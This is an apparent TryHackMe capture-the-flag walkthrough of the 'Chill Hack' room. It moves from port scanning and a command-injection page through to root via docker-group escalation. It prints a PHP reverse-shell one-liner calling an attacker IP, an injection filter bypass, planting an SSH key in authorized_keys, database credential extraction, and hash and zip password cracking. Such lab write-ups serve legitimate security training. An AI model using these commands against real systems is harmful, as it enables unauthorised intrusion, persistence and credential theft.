# 16 - Chill Hack

### Enumeration <a href="#enumeration" id="enumeration"></a>

Uisng nmap:\
\
From the nmap scan we can see the ports `21/ftp`, `22/ssh`, `80/http` are open. `Anonymous` login is allowed in `ftp` service.

<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/chillhack/nmap_scan.png" alt=""><figcaption></figcaption></figure>

I logged into the ftp server and found a text file. I downloaded it using the `get file-name` command.\


<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/chillhack/2.png" alt=""><figcaption></figcaption></figure>

Enumerating with FFUF:

`ffuf -u http://10.10.47.188/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -ic -c -t 1000 -fc 403 -e .php,.html` .\
\
![gobster\_1](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/4.png)\
Lets check `/secret` and we see a cmd injection point.\
![alert\_page](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/5.png)\
Then I tried `whoami` and the page successfully returned the output.\
![whoami\_command](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/6.png)\
So, I used this to bypass without trigerring the alert.

```bash
whoami;ls -la
```

<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/chillhack/7.png" alt=""><figcaption></figcaption></figure>

### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

***

Since that worked, I grabbed the php reverse shell payload and used it with `whoami` to bypass the alert. Remember to open a netcat listener in your local machine before executing the payload.

```bash
whoami;php -r '$sock=fsockopen("10.18.88.214",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

\
![reverse\_shell1](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/8.png) We get a shell.

### User flag <a href="#user-flag" id="user-flag"></a>

***

`sudo -l` to list the files that can be run as other users.

<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/chillhack/9.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/chillhack/11.png" alt=""><figcaption></figcaption></figure>

Take a look at the second input `$msg`. The code says that anything we put in the variable `msg` will be dumped into `/dev/null` which is like a blackhole…that is we cannot retrieve anything that is put into it. So, we can spawn a shell before it dumps into the `/dev/null`.\
\
First run the file as the user `apaar`.

```
sudo -u apaar ./.helpline.sh
```

Then, give a arbitary input for the first variable. Give `/bin/bash` as second input. And finally use `python pty` to get a stable shell.\
![shell\_apaar](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/12.png)\
The `user flag` is in the `home` directory of the user `apaar` in file named `local.txt`.

### Getting user anurodh <a href="#getting-user-anurodh" id="getting-user-anurodh"></a>

***

There are more than one ways to get to the credentials of the user `anurodh`.

#### Method 1 <a href="#method-1" id="method-1"></a>

***

After running `linpeas.sh` I found some ports running which are accessible only by the `localhost`.\
![linpeas\_port](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/15.png)\
I generated a `ssh key pair` in my local machine.

```
ssh-keygen
```

Enter the path for it to generate new `ssh key pair` in the local machine. Copy the contents of the `public key (id_rsa.pub)` and in the remote machine append it to the `/home/apaar/.ssh/authorized_keys` file.

```
echo "your-ssh-public-key-contents" >> /home/apaar/.ssh/authorized_keys
```

Now we can ssh into the machine using the private key `id_rsa`.

```
ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa
```

Here, we are basically tunnelling the port `9001` from the remote machine into our local machine `127.0.0.1:9001`.\
![ssh\_tunnel](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/17.png)\
Now we can access that service through our browser using `127.0.0.1:9001`.\
![login\_page](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/18.png)\


**Sub-Method 1**

***

I tried some common credentials but had no luck with it. After searching through the files for a bit I found the credentials for `mysql` in the file `/var/www/files/index.php`.\
![mysql\_creds](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/19.png)\
I connected to the `mysql service` from the remote machine.\


```
mysql -u root -p
```

\
Use the `mysql password` that we just found. Then I used some commands to finally arrive at the credentials.\


```
SHOW DATABASES;
USE webportal
SHOW TABLES;
SELECT * FROM users;
```

\
![webportal\_credentials](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/22.png)\
I used [crackstation](https://cryptichacker.github.io/posts/chillhack/crackstation.net) to crack the MD5 passwords. Then, I logged into the webportal with the credentials.\
![portal\_login](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/24.png)\
Download the image in the page `/hacker.php`.

**Sub-Method 2**

***

Without getting the credentials to the webportal and mysql we can still get to the page `/hacker.php`. Use `gobuster` with the common wordlist.\


```
gobuster dir -u http://127.0.0.1:9001/ -w /usr/share/dirb/wordlists/common.txt -x php 
```

\
![gobuster\_webportal](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/23.png)\
Download the image in the page `/hacker.php`.

***

**Before getting the password for the user `anurodh` I’ll also explain the second method which is wayyy easier than the first one.**

#### Method 2 <a href="#method-2" id="method-2"></a>

***

This is the method that I actually used to clear the room. It was just a coincidence that I saw the `/files` directory in the parent directory after I got the reverse shell. I tried using `python -m SimpleHTTPServer 8080` to transfer the files but it throwed an error stating that `python2` was not installed. Then, I used the `python3 http server`.\


```
python3 -m http.server 8080
```

\
And I downloaded the contents using browser from my local machine.

After I transferred everything in the `/files` directory to my local machine, I analysed it. And finally I got the password for the user `anurodh`.

***

**Now let’s continue from the part where we got the `.jpg` file from the `/files` directory.**

Use `steghide` to extract the contents of the image.

```
steghide --extract -sf hacker.jpg
```

The `zip file` is password protected. Use `fcrackzip` to bruteforce the password.

```
fcrackzip -u -v -D -p ~/Wordlists/rockyou.txt backup.zip
```

<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/chillhack/26.png" alt=""><figcaption></figcaption></figure>

The password for the user `anurodh` can be found as a base64 encoded string in the inflated `php` file. Decode it.\
![pass\_base64](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/27.png)\


Change the user to `anurodh` using `su anurodh` and use the password that we just found.

### Root flag <a href="#root-flag" id="root-flag"></a>

***

After using `id`, it seems that the user is in the `docker` group.\
![id\_docker](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/28.png)\
I grabbed the payload to get the shell access to root from `gtfobins`.\
![gtfo\_bins](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/29.png)\
The root flag is in the file named `proof.txt`.\
![root\_flag](https://cryptichacker.github.io/assets/img/tryhackme/chillhack/30.png)

Done.
